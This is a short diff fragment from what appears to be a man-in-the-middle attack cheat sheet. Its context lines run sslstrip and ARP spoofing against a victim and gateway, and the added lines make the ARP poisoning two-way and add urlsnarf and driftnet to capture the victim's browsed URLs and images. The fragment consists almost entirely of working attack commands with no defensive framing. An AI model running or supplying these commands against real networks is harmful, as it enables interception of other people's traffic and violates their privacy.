@@ -22,4 +22,12 @@ tail -f sslstrip.log
 
 #turn on arpspoof
 arpspoof -i eth0 -t ip_vic ip_gw
+arpspoof -i eth0 -t ip_gw ip_vic
+
+#urlsurf
+urlsnarf -i eth0
+
+#driftnet
+driftnet -i eth0
+
 
